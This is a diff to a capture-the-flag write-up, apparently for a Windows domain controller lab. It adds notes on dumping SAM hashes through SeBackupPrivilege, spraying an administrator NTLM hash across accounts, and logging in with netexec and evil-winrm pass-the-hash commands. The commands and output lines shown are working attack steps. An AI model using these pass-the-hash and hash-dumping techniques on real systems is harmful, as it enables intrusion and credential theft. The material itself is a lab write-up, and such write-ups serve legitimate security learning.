@@ -400,7 +400,8 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 ```
 
-
+The following article explains how to exploit this by saving the SAM and SYSTEM file, transferring them to my machine and using the pypykatz to dump the NTLM hashes
+[https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/]([url](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
 ```
 *Evil-WinRM* PS C:\Users\h.grangon\Desktop> mkdir C:\Temp
 
@@ -463,8 +464,7 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7
 
 
 ## Password Spray
-Administrator didn't work
-
+The Administrator credentials were no longer valid
 ```
 └─$ netexec smb 10.1.213.153 -u Administrator -H 520126a03f5d5a8d836f1c4f34ede7ce
 SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
@@ -472,7 +472,7 @@ SMB         10.1.213.153    445    DC01             [-] BUILDINGMAGIC.LOCAL\Admi
 
 ```
 
-## a.flatch
+I took the users.txt list I created earlier and used the administratior Hash to see if it worked with any other accoount and found that a.flatch had administrator access
 ![[Pasted image 20251103233127.png]]
 
 ```
@@ -490,18 +490,17 @@ SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\a.fl
 ```
 
 
-## Shell As Admin
+## Shell As Admin (a.flatch)
+I could then login using winrm and access the Adminstrator Desktop to directory to obtain the root.txt file
 ```
 └─$ netexec winrm 10.1.213.153 -u a.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce 
 WINRM       10.1.213.153    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:BUILDINGMAGIC.LOCAL)
-/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
-  arc4 = algorithms.ARC4(self._key)
 WINRM       10.1.213.153    5985   DC01             [+] BUILDINGMAGIC.LOCAL\a.flatch:520126a03f5d5a8d836f1c4f34ede7ce (Pwn3d!)
 
 ```
 
 ```
-└─$ evil-winrm -i 10.1.213.153 -u a.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce
+evil-winrm -i 10.1.213.153 -u a.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce
                                         
 Evil-WinRM shell v3.7
                                         
